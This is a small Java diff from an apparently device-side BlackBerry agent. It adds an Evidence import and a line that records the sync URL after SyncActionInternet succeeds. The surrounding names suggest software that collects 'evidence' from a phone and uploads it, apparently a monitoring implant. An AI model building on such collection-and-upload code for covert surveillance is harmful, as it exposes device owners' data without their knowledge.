@@ -21,6 +21,7 @@ import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
+import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.transfer.Transfer;
 import blackberry.utils.Check;
@@ -152,6 +153,7 @@ public class SyncActionInternet extends SubAction {
         if (ret) {
             //#ifdef DEBUG
             debug.info("SyncAction OK");
+            Evidence.info("Sync:" + transfer.getUrl());
             //#endif
 
             status.synced = true;
